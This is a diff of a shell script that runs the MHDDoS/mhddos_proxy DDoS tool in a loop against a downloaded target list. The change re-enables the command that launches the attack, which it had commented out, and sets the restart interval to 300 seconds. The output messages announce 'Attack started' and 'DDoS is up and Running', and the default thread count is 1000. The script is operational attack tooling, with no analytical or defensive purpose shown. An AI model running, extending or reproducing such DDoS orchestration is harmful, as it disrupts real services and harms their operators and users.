@@ -16,7 +16,7 @@ num_of_copies="${1:-1}"
 ## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
 ## It allows to download updates for mhddos_proxy, MHDDoS and target list.
 ## By default 900s (15m), can be passed as second parameter
-restart_interval="30"
+restart_interval="300"
 
 #parameters that passed to python scrypt
 threads="${2:-1000}"
@@ -79,7 +79,7 @@ do
             #echo $cmd_line
             #echo $cmd_line $proxy_interval $threads $rpc
             cd ~/mhddos_proxy
-            ##python3 runner.py --table $cmd_line $proxy_interval $rpc&    ##$threads
+            python3 runner.py --table $cmd_line $proxy_interval $rpc&    ##$threads
             echo -e "Attack started. Wait a few minutes for output"
    done
 echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
